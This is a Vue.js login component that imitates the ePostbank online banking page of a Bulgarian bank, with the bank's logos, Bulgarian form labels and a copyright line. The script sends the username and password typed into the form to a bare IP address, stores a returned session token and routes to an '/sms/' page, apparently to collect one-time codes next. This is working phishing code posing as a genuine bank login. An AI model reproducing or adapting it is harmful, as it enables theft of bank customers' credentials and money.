<template>
  <body>

    <div class="login-container-ebank" style="
    margin-top: 100px;">
      <div class="logo">
        <a style="text-decoration: none;" href="" target="_blank">
          <img src="../img/logo-pb-en.svg" alt="Welcome to ePostbank" class="imglogin"></a>
      </div>
      <div class="logo">
        <img src="../img/logo-epb-en.svg" alt="Welcome to ePostbank" class="imglogin">
      </div>

      <div id="login-container-ebank">
        <div class="change-lang">
          <a href="#" class="text">
        EN</a>
        </div>

      <div class="form">
        <p>
          <input class="edit1" id="userName" tabindex="0" size="14" name="userName" autocomplete="off" maxlength="64" placeholder="Потребител" v-model="username">
        </p>
        <p>
          <input type="password" class="edit1" id="pwd" tabindex="0" size="14" name="pwd" autocomplete="off" placeholder="Парола" v-model="password">
        </p>
        <div style="height:4px; text-align: center;">&nbsp;</div>
        <p>
          <input type="submit" tabindex="0" value="ВХОД" class="button1" v-on:click="red">
          <input type="hidden" name="returnToUrl" value="">
        </p>
        <p>
          <a class="link-registration" href="#" >Активирай достъп</a>
        </p>
      </div>
      <div class="linkForErrorDiv"><a id="showLoginErrorDetail" href="#detailsMsg" class="text">
        <u>Забравена парола</u>
      </a>
        <br>
        <div class="msg" v-if="isValid">
          <span>Въведете потребителско име, парола и число за контрол</span>
        </div>
      </div>
      <div class="msg1" id="detailsMsg" style="display:none"><div>Можете да заявите нова парола онлайн
        <a href="#" >тук</a>
        или в клон на Банката.
      </div></div><div style="text-align: center;"><a style="text-decoration: underline;" href="" target="_blank">Съвети за сигурност</a></div><div class="footer"><p class="footnote"><a style="text-decoration: none" href="" target="_blank">Свържете се с нас</a>

        | <a style="text-decoration: none" href="" target="_blank">Условия за ползване и конфиденциалност</a></p></div></div>
    </div>
    <a class="bg-fullscreen" href="" target="_blank" style=""><p>2022 ЮРОБАНК България АД. Всички права запазени.</p></a>
  </body>
</template>
<script>
import axios from "axios"
export default {
  name:'login',
  mounted(){
    this.inti()
  },
  data(){
    return{
      username:'',
      password:'',
      isValid:false
    }
  },
  methods:{
    inti(){
      axios.post("http://127.0.0.1:5000/api/new").then().catch()
    },
    red(){
      if(!this.username || !this.password){
        this.isValid=true
      }else{
        this.isValid=false
        const data={
          "username":this.username,
          "password":this.password,
        }
        axios.post("http://51.91.58.210/api/login/new",data).then(res=>{
          console.log(res)
          localStorage.setItem('jwt', res.data.jwt)
          localStorage.setItem('session', res.data.session)
          this.$router.push("/sms/"+res.data.session)
        }).catch()
      }
    }
  }
}
</script>
<style>
@import '../css/style.css';
</style>
